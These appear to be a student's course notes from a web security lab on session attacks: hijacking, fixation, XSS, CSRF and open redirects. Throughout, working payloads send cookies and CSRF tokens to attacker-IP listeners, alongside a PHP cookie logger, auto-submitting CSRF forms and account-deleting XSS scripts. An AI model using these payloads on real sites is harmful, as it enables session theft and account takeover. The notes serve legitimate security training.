# Session Security 

## Introduction to Sessions

a user session is a series of requests originating from the same client and the associated responses during a specific time period    
modern web apps need to maintain sessions to keep track of info and status about each user   
user sessions facilitate the assignment of access or authorization rights, localization settings, etc., while users interact with an app pre and post authentication 

HTTP is stateless meaning that each request-response is unrelated to other transactions   
each request should carry all needed info for the server to act upon it appropriately, and the session state resides on the client's side only 

web apps use cookies, url parameters, url arguments (GET), and body arguments (POST) for session tracking and management 

### Session identifier security 

a unique session identifier (Session ID) or token is the basis upon which user sessions are generated and distinguished   

session hijacking = an attacker obtains a session id and can essentially impersonate the user   

a session id can be: 
- captured through passive traffic/packet sniffing
- identified in logs 
- predicted 
- brute forced 

a session ids security level depends on its: 
- validity scope (valid for one session only) 
- randomness (generated through a robust random number/string generation algorithm)
- validity time (should expire after a certain amount of time)

a session ids security level also depends on the location it is stored: 
- URL - http referer header can leak session id to other sites, also browser history will contain session info stored in the url   
- HTML - session id can be seen in both the browser's cache memory and any intermediate proxies 
- sessionStorage - SessionStorage is a browser storage feature introduced in HTML5. Session ids stored in it can be retrieved as long as the tab or the browser is open; sessionStorage data gets cleared when the page session ends. Know that a page session survives over page reloads and restores 
- localStorage - LocalStorage is a browser storage feature in HTML5. Can be retrieved as long as local storage is not deleted by the user. Local storage will not be deleted on browser close with the exception of incognito mode 

### Session attacks 

some different session attacks are: 
- session hijacking = attacker takes advantage of insecure session identifiers, obtains them, and uses them to authenticate to the server as the victim 
- session fixation = when an attacker can fixate a valid session identifier, attacker will then have to trick the victim into logging into the app using the session id. If the victim does login then the attacker can do a session hijacking attack 
- XSS with a focus on user sessions 
- CSRF = force and end user to execute inadvertent actions on a web app in which they are currently authenticated. Usually helped with an attacker-crafted web page that the victim must visit or interact with. These pages contain malicious requests that inherit the identity and privileges of the victim to perform an undesired function on the victim's behalf 
- open redirects = when an attacker can redirect a victim to an attacker-controlled site by abusing legit site's redirection functionality. 

### Module targets 

we will refer to URLs such as `http://xss.htb.net` with many vhosts that all map to a different directory on the same host   
we will have to make manual entries in our `/etc/hosts`: 

```shell
IP=ENTER SPAWNED TARGET IP HERE
printf "%s\t%s\n\n" "$IP" "xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net" | sudo tee -a /etc/hosts
```

## Session Hijacking 

attackers take advantage of insecure session ids, obtains them, and uses them to authenticate to the server and impersonate the victim 

can obtain sid using the most common methods: 
- passive traffic sniffing 
- XSS
- browser history or log-diving
- read access to a db containing session info 

an attacker might even be able to brute force if the security level of the sid is low 

### Session hijacking example 

we can login to our target with our example credentials and see: 

![](Images/Pasted%20image%2020240304114342.png)

if we look at our cookies we can see that we have an `auth-session` cookie that we can copy: 

![](Images/Pasted%20image%2020240304114430.png)

we can simulate an attacker using a very basic example of copying this cookie value, opening up the page in an incognito window, and then modifying our new cookie to be the victim's cookie: 

![](Images/Pasted%20image%2020240304114614.png)

![](Images/Pasted%20image%2020240304114629.png)

note that some web apps will use more than one cookie for session tracking 

## Session Fixation 

attacker can fixate a valid session id and trick the victim into logging in using the session id, when the victim does then the attacker can perform session hijacking  

these bugs usually occur when session id such as cookies are being accepted from URL query strings or POST data 

### Stage 1: Attacker manages to obtain valid session id 

don't need to authenticate to app to get valid session id, and many apps assign valid session ids to anyone who browses them   
attacker can be assigned valid session id without needing to authenticate 

### Stage 2: Attacker manages to fixate a valid session id 

state 1 can turn into a session fixation vulnerability if: 

the assigned session id pre-login remains the same post-login AND session ids such as cookies are being accepted from URL query strings or POST data and propagated to the app 

if for example a session related parameter is included in the url and not the cookie header, and any specified value eventually becomes a session id, then an attacker can fixate a session 

### Stage 3: Attacker tricks victim into creating session using fixated session id 

the attacker only needs to craft a URL to lure the the victim into visiting it, if the user does then the app will assign the session id to the victim 

the attacker can then proceed to a session hijacking attack since the session id is already known 

### Session fixation example

our target has a url token parameter that is also the value set for the `PHPSESSID` cookie: 

![](Images/Pasted%20image%2020240304120522.png)

if any value or valid session id specified with the `token` parameter is propagated to the `PHPSESSID` cookie then there is likely a session fixation vulnerability 

we can see that if we create a new session and modify the token parameter to our own custom value that it does get propagated to the session cookie: 

![](Images/Pasted%20image%2020240304120756.png)

the attacker could then send a similar URL to a victim, if the victim then logs into the app the attacker can then hijack their session since the session id is already known 

note that another way of finding this is by blindly putting the session id name and value in the url and refreshing 

for example if we look at `http://insecure.exampleapp.com/login` and the session id is the `PHPSESSID` cookie, then to test for session fixation we could try: 

`http://insecure.exampleapp.com/login?PHPSESSID=AttackerSpecifiedCookieValue`

and see if the specified cookie value is propagated to the app 

the app in this example has the following vulnerable code: 

```php
<?php
    if (!isset($_GET["token"])) {
        session_start();
        header("Location: /?redirect_uri=/complete.html&token=" . session_id());
    } else {
        setcookie("PHPSESSID", $_GET["token"]);
    }
?>
```

if the token parameter isn't defined then start a session and generate a valid session id, otherwise if the token is specified then simply set the session cookie to its value directly   

## Obtaining Session Identifiers Without User Interaction 

there are many techniques to get session ids and they can be split into two categories: 
- without user interaction 
- requiring user interaction

### Obtaining session identifiers via traffic sniffing

traffic sniffing requires the attacker and victim to be on the same local network; not possible to sniff traffic remotely   
even if traffic is sniffed, if it is encrypted then it will still likely be impossible to decrypt 

obtaining session identifiers through sniffing requires: 
- attacker to be positioned on same local network 
- unencrypted HTTP traffic 

if we go to our target we can see that we have an `auth-session` cookie: 

![](Images/Pasted%20image%2020240304165928.png)

if we start a wireshark packet capture on our `tun0` interface, we can simulate victim behavior by opening up a new session on the site in an incognito window and login: 

![](Images/Pasted%20image%2020240304170301.png)

![](Images/Pasted%20image%2020240304170330.png)

we can now look for the victim's cookie in the traffic by looking for HTTP traffic: 

![](Images/Pasted%20image%2020240304170413.png)

then using the `Edit -> Find Packet` option we can open the search bar and specify `Packet bytes` to look for the `auth-session` string: 

![](Images/Pasted%20image%2020240304170707.png)

because the traffic is HTTP we can see the auth-session cookie being set and we can copy it: 

![](Images/Pasted%20image%2020240304171246.png)

again, just as we did in the previous session hijacking example we can simply use this cookie in our browser session to successfully authenticate as the victim

### Obtaining session identifiers post-exploitation (web server access)

during the post-exploitation phase, session ids and session data can be retrieved from a web server's disk or memory 

#### PHP

the PHP `session-save_path` entry in the PHP.ini file shows where the session data will be stored 

```shell
locate php.ini
cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
```

![](Images/Pasted%20image%2020240304171550.png)

in the default configuration's case it will be in the `/var/lib/php/sessions`  
in order to see a victim's session id they will need to be logged in 

the session files have the naming convention of `sess_<sessionID>`

```shell-session
ls /var/lib/php/sessions
cat //var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
```

#### Java

the `Manager` element represents the session manager that is used to create and maintain HTTP sessions   

tomcat has two standard implementations of `Manager`  
default stores active sessions, and the optional one stores active sessions that have been swapped out (in addition to saving sessions across a server restart) in a storage location that is selected via the use of an appropriate `Store` nested element   
the filename of the default session data file is `SESSIONS.ser`

http://tomcat.apache.org/tomcat-6.0-doc/config/manager.html
#### .NET 

session data can be found in: 
- the app worker process (aspnet_wp.exe) in the InProc Session Mode
- StateServer (windows service residing on IIS or a separate server) in the OutProc Session Mode
- SQL server 

https://www.c-sharpcorner.com/UploadFile/225740/introduction-of-session-in-Asp-Net/

### Obtaining session identifiers post-exploitation (database access) 

in cases where you have direct access to a database like in a SQL injection or with credentials, you should always check for stored user sessions

```sql
show databases;
use project;
show tables;
select * from users;
```

![](Images/Pasted%20image%2020240304173607.png)

```sql
select * from all_sessions;
select * from all_sessions where id=3;
```

![](Images/Pasted%20image%2020240304173626.png)

remember that even though our example in this section specified that we were on the same local network, if the app was an intranet app and we had access to the company's VPN we would still have access to packet sniffing as long as any user connected to the VPN could interact with the app 

## Cross-Site Scripting (XSS)

for an xss attack to result in a session cookie leakage the following requirements must be fulfilled: 
- session cookies should be carried in all HTTP requests
- session cookies should be accessible by JS code (the HTTPOnly attribute can't be enabled)

lets login to our target: 

![](Images/Pasted%20image%2020240304175548.png)

for this we will prefer to use payloads with `onload`, `onerror`, or `onmouseover`   
in our payload we will also use `document.domain` to make sure that the JS is being executed on the actual domain and not in a sandbox   

lets use 3 different payloads for each field: 

![](Images/Pasted%20image%2020240304175802.png)

when we hit the save button in the UI we will not see our code get executed, this is because often the code will not be called until another app functionality triggers it 

if we hit the share button we can then see our country payload triggers: 

![](Images/Pasted%20image%2020240304175936.png)

because our profile is saved and publicly accessible, this seems to be a stored XSS vulnerability   

lets now check to see if the HTTPOnly setting is off: 

![](Images/Pasted%20image%2020240304180116.png) 

### Obtaining session cookies through XSS 

lets now create a cookie-logging script in PHP to practice obtaining a victim's session cookie through sharing a vulnerable link to the stored XSS public profile   

```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```

the above script waits for anyone to request `?c=+document.cookie` and it will parse the included cookie 

we can run the script with: 

```shell
 php -S <VPN/TUN Adapter IP>:8000
```

lets go back and fill in our vulnerable profile's email and telephone fields because we did not find any vulnerabilities and we want it to appear more legit   

then in the country field we can input our payload: 

```javascript
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```

note that if we were doing this in the real world we would want to use something like XSSHunter, Burp Collaborator, or Project Interactsh since a default PHP server or netcat might not send data in the correct form when the target web app uses HTTPS

a sample HTTPS payload could look like: 

```javascript
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

now to simulate the victim we will login: 

![](Images/Pasted%20image%2020240304181054.png)

our server hosting our script is running and our vulnerable profile has our payload in it so now as the logged in victim lets navigate to our malicious profile by going to `http://xss.htb.net/profile?email=<malicious profile's email>`:

![](Images/Pasted%20image%2020240304181431.png)

we can see that the logic of the log.php file we created executes as we are redirected to google, and we can look at our server to see the response: 

![](Images/Pasted%20image%2020240304181513.png)

we can then look in the cookielog.txt file to see the stolen cookie and then complete a session hijacking attack 

### Obtaining session cookies via XSS (netcat edition)

instead of a cookie logging script we could have used the venerable netcat tool 

lets instead use this payload in the country field: 

```javascript
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

then lets create a netcat listener: 

`nc -nlvp 8000`

then to simulate the victim we can open a new incognito and go directly to our stored XSS profile where we see our payload:  

![](Images/Pasted%20image%2020240304182117.png)

each time the user hovers over the big "test" in the country section we will steal the cookie: 

![](Images/Pasted%20image%2020240304182208.png)

keep in mind this is the base64 encoded version 

we don't always have to use the `window.location()` object that causes the victim to get redirected, we can use `fetch()` which can get data like cookies and send it to our server without redirects   
this is stealthier 

an example of this can be: 

```javascript
<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
```

remember that in these attacks even if the app was using SSL encryption the attacker would still be able to capture the cookies because they are client-side 

## Cross-Site Request Forgery (CSRF or XSRF) 

CSRF is forcing an end-user to execute inadvertent actions on a web app they are authenticated to   
usually mounted with the help of attacker crafted web apps that the user must visit or interact with   
these pages contain malicious requests that inherit the identify and privileges of the victim to perform an undesired function on the victim's behalf   
CSRF attacks generally target functions that cause a state change on the server but can also be used for info disclosure 

during CSRF, the attacker doesn't need to read the server's response to the malicious cross-site request   
the Same-Origin policy, which restricts how a document or script loaded by one origin can interact with a resource, will not prevent this because the same-origin policy will prevent the attacker from reading the server's response but in a CSRF the attacker doesn't have to 

a web app is vulnerable to CSRF when: 
- all parameters required for the targeted request can be determined or guessed by the attacker 
- app session management is solely based on HTTP cookies which are auto included in browser requests 

to successfully exploit a CSRF we need: 
- to craft a malicious web page that will issue a valid request impersonating the victim 
- the victim to be logged into the app at the same time when the cross-site request is issued 

### Cross-site request forgery example 

in our target if we capture the save request call in burp: 

![](Images/Pasted%20image%2020240305132840.png)

![](Images/Pasted%20image%2020240305132859.png)

in this request we don't see any type of anti-csrf token 

lets now try to execute a CSRF attack against our account that will change her profile details by visiting another site while logged in to the target app 

first we make an HTML page that will be our malicious site: 

```html
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

then we host this page with a simple python server using `python -m http.server 1337`    

then for the victim behavior we make sure we are still logged in and visit the page we are hosting: `http://<VPN/TUN Adapter IP>:1337/notmalicious.html`

we can see that after visiting the site we can see the logic of changing the profile details gets executed: 

![](Images/Pasted%20image%2020240305133756.png)

remember that this attack will also work with GET based requests 

## Cross-Site Request Forgery (GET-Based)

similar to how we can extract session cookies from apps that don't use SSL encryption, we can do the same with CSRF tokens included in unencrypted requests 

on our new target after using the save functionality we will see a confirmation window: 

![](Images/Pasted%20image%2020240305134747.png)

if we capture this second save functionality we can see it is a GET request: 

![](Images/Pasted%20image%2020240305134819.png)

one of the parameters, `csrf` is the anti-csrf token   

lets say we were on the local network and sniffed the above request from the victim  
we can use this to deface the victim's profile through a csrf attack 

we can create and host another malicious HTML file: 

```html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

we can use the sniffed anti-csrf token in the above hidden `csrf` input field value   

now as the logged in victim we can simulate their behavior by visiting our malicious site while logged in `http://<VPN/TUN Adapter IP>:1337/notmalicious_get.html`: 

![](Images/Pasted%20image%2020240305135634.png)

again our code is executed and the victim's profile is successfully edited 

remember that in this example even if there was SSL encryption we would still be able to perform this attack because the anti-csrf token is directly in the URL, so we would only need to be on the local network and sniff this request 

## Cross-Site Request Forgery (POST-based)

in our target we can delete our account and see: 

![](Images/Pasted%20image%2020240305141634.png)

the email is reflected on the page based on the url parameter so lets try inputting some HTML into the value like: 

```html
<h1>h1<u>underline<%2fu><%2fh1>
```

![](Images/Pasted%20image%2020240305141805.png)

we can see in the source code that our injection happens before a single quote: 


```html
<h1>h1<u>underline</u></h1></div><input name="csrf" type="hidden" value="e8af075a40001423492508756907fe14644ba70f" meta-dev='testdata'
```

we can abuse this to leak the csrf token 

lets listen on netcat on port 8000 with `nc -nlvp 8000`

then we can send the following payload to our victim to get the csrf token: 

```html
<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
```

`http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f`

then as the logged in victim we can visit our malicious site and see the captured request on our netcat listener: 

![](Images/Pasted%20image%2020240305142719.png)

we can see that our code is executed and we get the encoded csrf token for the victim 

remember that this POST request attack doesn't rely on the being in the same local network as the user

also in this scenario even if the site was using secure cookies the attacker would still be able to leak the CSRF token because the connection is what leaks the token 

## XSS and CSRF Chaining 

sometimes even if we bypass the CSRF protections we might not be able to create cross-site requests due to some sort of same origin or same site restriction   
in this case we can try chaining vulnerabilities to get the same result 

our new target has: 
- same origin and same site protections as anti-csrf measures 
- the apps country field is vulnerable to stored XSS attacks like we saw in the previous XSS section 

malicious cross-site requests are out of the question due to the protections but we can still perform CSRF attacks through the stored XSS vulnerability   
we will leverage the stored XSS vulnerability to issue a state-changing request against the web app   
a request through XSS will bypass any same origin or same site protection since it will derive from the same domain   

if we use the change visibility button on our new target and capture the requests we can see: 

![](Images/Pasted%20image%2020240305172406.png)

![](Images/Pasted%20image%2020240305172416.png)

the payload we want to insert into the country field is: 

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```

this script will create an ObjectVariable called `req` that will generate our request   
we send the GET request to `/app/change-visibility`  

in the `handleResponse` function we define a token variable that gets the value of the `responseText` from the page we specified in our earlier request and looks for the hidden csrf field to grab the value 

we know how to look for this by looking through the HTML: 

![](Images/Pasted%20image%2020240305173546.png)

if we can't find it there but we know that there are csrf tokens in use, then make sure to look through the source code, or use your own csrf token and look for it in the source code   

the `handleRespose` function then sends the POST request to actually send the form info (the GET request was simply to get to the correct page to do so)   
it will mimic the captured POST request logic by setting the csrf token value and the action value: 

![](Images/Pasted%20image%2020240305173919.png)

we now go to the victim's profile and set the country field to our payload: 

![](Images/Pasted%20image%2020240305174132.png)

then to simulate our victim's behavior we log in to an account: 

![](Images/Pasted%20image%2020240305174232.png)

notice that this profile doesn't have the "share" button, meaning that it is currently private  
our payload script on our malicious user profile will attempt to change other profiles to become public

now go and visit our public profile with our script in it `http://minilab.htb.net/profile?email=ela.stienen@example.com`: 

![](Images/Pasted%20image%2020240305174343.png)

then when we go back to our victim's profile we can see that it has been changed to a public one with the "share" button because of our script: 

![](Images/Pasted%20image%2020240305174601.png)

we can do the same with the delete functionality if we capture the request and modify our payload: 

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/delete/mhmdth.rdyy@example.com',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/delete', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token);
};
</script>
```

remember that these attacks can still go through even with the Same Origin policy because our code is executed on the domain   

## Exploiting Weak CSRF Tokens 

often web apps don't use secure or robust token generation algorithms   
we can see if this is the case if we register an account and look into the requests to find a csrf token, and check if the MD5 hash of the username is equal to the value of the token 

if we look at the requests being sent using the change visibility function and the following confirm function, we can see the csrf token: 

![](Images/Pasted%20image%2020240305183123.png)

lets try to make the MD5 token of the username goldenpeacock467: 

```shell
echo -n goldenpeacock467 | md5sum
```

![](Images/Pasted%20image%2020240305183226.png)

we can see that this is the same value as the set csrf token in the requests   
in other examples we can try different methods like `md5(username`, `sha1(username)`, `md5(current date + username)`, etc.   
don't spend too much time on this since it can be impossible to guess, but it's worth a shot 

lets create our malicious HTML:

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="never">
    <title>Proof-of-concept</title>
    <link rel="stylesheet" href="styles.css">
    <script src="./md5.min.js"></script>
</head>

<body>
    <h1> Click Start to win!</h1>
    <button class="button" onclick="trigger()">Start!</button>

    <script>
        let host = 'http://csrf.htb.net'

        function trigger(){
            // Creating/Refreshing the token in server side.
            window.open(`${host}/app/change-visibility`)
            window.setTimeout(startPoc, 2000)
        }

        function startPoc() {
            // Setting the username
            let hash = md5("crazygorilla983")

            window.location = `${host}/app/change-visibility/confirm?csrf=${hash}&action=change`
        }
    </script>
</body>
</html>
```

then lets also put in the md5 functionality min.js file in the same directory: 

```javascript
!function(n){"use strict";function d(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function f(n,t,r,e,o,u){return d((u=d(d(t,n),d(e,u)))<<o|u>>>32-o,r)}function l(n,t,r,e,o,u,c){return f(t&r|~t&e,n,t,o,u,c)}function g(n,t,r,e,o,u,c){return f(t&e|r&~e,n,t,o,u,c)}function v(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}function c(n,t){var r,e,o,u;n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;for(var c=1732584193,f=-271733879,i=-1732584194,a=271733878,h=0;h<n.length;h+=16)c=l(r=c,e=f,o=i,u=a,n[h],7,-680876936),a=l(a,c,f,i,n[h+1],12,-389564586),i=l(i,a,c,f,n[h+2],17,606105819),f=l(f,i,a,c,n[h+3],22,-1044525330),c=l(c,f,i,a,n[h+4],7,-176418897),a=l(a,c,f,i,n[h+5],12,1200080426),i=l(i,a,c,f,n[h+6],17,-1473231341),f=l(f,i,a,c,n[h+7],22,-45705983),c=l(c,f,i,a,n[h+8],7,1770035416),a=l(a,c,f,i,n[h+9],12,-1958414417),i=l(i,a,c,f,n[h+10],17,-42063),f=l(f,i,a,c,n[h+11],22,-1990404162),c=l(c,f,i,a,n[h+12],7,1804603682),a=l(a,c,f,i,n[h+13],12,-40341101),i=l(i,a,c,f,n[h+14],17,-1502002290),c=g(c,f=l(f,i,a,c,n[h+15],22,1236535329),i,a,n[h+1],5,-165796510),a=g(a,c,f,i,n[h+6],9,-1069501632),i=g(i,a,c,f,n[h+11],14,643717713),f=g(f,i,a,c,n[h],20,-373897302),c=g(c,f,i,a,n[h+5],5,-701558691),a=g(a,c,f,i,n[h+10],9,38016083),i=g(i,a,c,f,n[h+15],14,-660478335),f=g(f,i,a,c,n[h+4],20,-405537848),c=g(c,f,i,a,n[h+9],5,568446438),a=g(a,c,f,i,n[h+14],9,-1019803690),i=g(i,a,c,f,n[h+3],14,-187363961),f=g(f,i,a,c,n[h+8],20,1163531501),c=g(c,f,i,a,n[h+13],5,-1444681467),a=g(a,c,f,i,n[h+2],9,-51403784),i=g(i,a,c,f,n[h+7],14,1735328473),c=v(c,f=g(f,i,a,c,n[h+12],20,-1926607734),i,a,n[h+5],4,-378558),a=v(a,c,f,i,n[h+8],11,-2022574463),i=v(i,a,c,f,n[h+11],16,1839030562),f=v(f,i,a,c,n[h+14],23,-35309556),c=v(c,f,i,a,n[h+1],4,-1530992060),a=v(a,c,f,i,n[h+4],11,1272893353),i=v(i,a,c,f,n[h+7],16,-155497632),f=v(f,i,a,c,n[h+10],23,-1094730640),c=v(c,f,i,a,n[h+13],4,681279174),a=v(a,c,f,i,n[h],11,-358537222),i=v(i,a,c,f,n[h+3],16,-722521979),f=v(f,i,a,c,n[h+6],23,76029189),c=v(c,f,i,a,n[h+9],4,-640364487),a=v(a,c,f,i,n[h+12],11,-421815835),i=v(i,a,c,f,n[h+15],16,530742520),c=m(c,f=v(f,i,a,c,n[h+2],23,-995338651),i,a,n[h],6,-198630844),a=m(a,c,f,i,n[h+7],10,1126891415),i=m(i,a,c,f,n[h+14],15,-1416354905),f=m(f,i,a,c,n[h+5],21,-57434055),c=m(c,f,i,a,n[h+12],6,1700485571),a=m(a,c,f,i,n[h+3],10,-1894986606),i=m(i,a,c,f,n[h+10],15,-1051523),f=m(f,i,a,c,n[h+1],21,-2054922799),c=m(c,f,i,a,n[h+8],6,1873313359),a=m(a,c,f,i,n[h+15],10,-30611744),i=m(i,a,c,f,n[h+6],15,-1560198380),f=m(f,i,a,c,n[h+13],21,1309151649),c=m(c,f,i,a,n[h+4],6,-145523070),a=m(a,c,f,i,n[h+11],10,-1120210379),i=m(i,a,c,f,n[h+2],15,718787259),f=m(f,i,a,c,n[h+9],21,-343485551),c=d(c,r),f=d(f,e),i=d(i,o),a=d(a,u);return[c,f,i,a]}function i(n){for(var t="",r=32*n.length,e=0;e<r;e+=8)t+=String.fromCharCode(n[e>>5]>>>e%32&255);return t}function a(n){var t=[];for(t[(n.length>>2)-1]=void 0,e=0;e<t.length;e+=1)t[e]=0;for(var r=8*n.length,e=0;e<r;e+=8)t[e>>5]|=(255&n.charCodeAt(e/8))<<e%32;return t}function e(n){for(var t,r="0123456789abcdef",e="",o=0;o<n.length;o+=1)t=n.charCodeAt(o),e+=r.charAt(t>>>4&15)+r.charAt(15&t);return e}function r(n){return unescape(encodeURIComponent(n))}function o(n){return i(c(a(n=r(n)),8*n.length))}function u(n,t){return function(n,t){var r,e=a(n),o=[],u=[];for(o[15]=u[15]=void 0,16<e.length&&(e=c(e,8*n.length)),r=0;r<16;r+=1)o[r]=909522486^e[r],u[r]=1549556828^e[r];return t=c(o.concat(a(t)),512+8*t.length),i(c(u.concat(t),640))}(r(n),r(t))}function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}"function"==typeof define&&define.amd?define(function(){return t}):"object"==typeof module&&module.exports?module.exports=t:n.md5=t}(this);
//# sourceMappingURL=md5.min.js.map
```

then lets host them with `python -m http.server 1337`

we can login as our victim and then navigate to our malicious site `http://<VPN/TUN Adapter IP>:1337/press_start_2_win.html`: 

![](Images/Pasted%20image%2020240305192919.png)

pressing the start button (as our victim) will then force their profile to become public: 

![](Images/Pasted%20image%2020240305193012.png)

obviously if this were a real example our malicious site would be crafted to look for legit, but the purpose was to show that we can generate scripts to automatically use the discovered token generating logic 

remember that in this example we use a user-triggered on mouse click event to avoid popup blockers

## Additional CSRF Protection Bypasses

there are some additional CSRF protections that are out of the scope of this module but are still nice to know

### Null value

you can try making the csrf token a null or empty value  
this may work because sometimes the check is only looking for the header and does not validate the token value

### Random csrf token 

using a randomly generated token of the same length as valid tokens may also work because some protections only check that the token has a value of the correct length 

### Use another session's csrf token 

another method is using the same csrf token across accounts, this may work if the app doesn't validate if the csrf token is tied to a specific account and only checks if it is algorithmically correct 

you can test this by creating two accounts, getting a token from one account, and then changing the second account's token to the first account's token   
if you can successfully execute requests with another user's token then you can successfully execute CSRF attacks 

### Request method tampering 

can also try changing the request method like from POST to GET because unexpected requests may be served without the need for a csrf token 

### Session fixation > CSRF 

sometimes sites use a double-submit cookie as a defense against csrf which makes the request contain the same random token as a cookie and as a request parameter   
the server will check if these two values are equal 

if this technique is being used then the app might not keep the valid token on the server-side, meaning it doesn't have a way to know if any token is legit and just checks if the token and cookie are the same 

session fixation can then be used to create our own token value and execute a CSRF attack with a request like: 

```http
POST /change_password
Cookie: CSRF-Token=fixed_token;
POST body:
new_password=pwned&CSRF-Token=fixed_token
```

### Anti-csrf protection via the referrer header 

if an app is using the referrer header as anti-csrf then you can try just removing it   

you can add this meta tag to your hosted CSRF page: 

`<meta name="referrer" content="no-referrer"`

### Bypass the regex 

sometimes the referrer has a whitelist regex or a regex that allows one specific domain 

for example if the referrer header is checking for "google.com" then we could try something like "google.com.pwned.m3", "pwned.m3?www.google.com", or "pwned.m3/www.google.com" 

## Open Redirect 

an open redirect vulnerability is when an attacker can redirect a victim to an attacker-controlled site by abusing a legit app's redirection functionality 

```php
$red = $_GET['url'];
header("Location: " . $red);
```

the above code will use a url parameter without any validation to put in the response header for the url to redirect the page to 

an attacker can abuse this lack of validation with a url like: 

`trusted.site/index.php?url=https://evil.com`

always make sure to look for these types of parameters which can look like: 

- ?url=
- ?link=
- ?redirect=
- ?redirecturl=
- ?redirect_uri=
- ?return=
- ?return_to=
- ?returnurl=
- ?go=
- ?goto=
- ?exit=
- ?exitpage=
- ?fromurl=
- ?fromuri=
- ?redirect_to=
- ?next=
- ?newurl=
- ?redir=

### Open redirect example 

in our target we can see a url with a `redirect_uri` parameter: 

![](Images/Pasted%20image%2020240306105716.png)

a token is also used when using the reset password functionality and is making a POST request to the page specified by the `redirect_uri` parameters: 

![](Images/Pasted%20image%2020240306105842.png)

we can test if this is vulnerable to open redirect by inserting our own netcat hosted IP and port into the redirect parameter: 

`oredirect.htb.net/?redirect_uri=http://10.10.15.245:1337&token=mlf2bhmj3cg29rv689lm92jhu3`

then in a new incognito window we can simulate the victim by going to our malicious link and using the site functionality which will generate a response on our netcat listener: 

![](Images/Pasted%20image%2020240306110535.png)

open redirect vulnerabilities are usually used to create legit-looking phishing URLs as well as what we just saw to steal valid user session tokens 

remember that this attack would have worked against a GET based form as well 

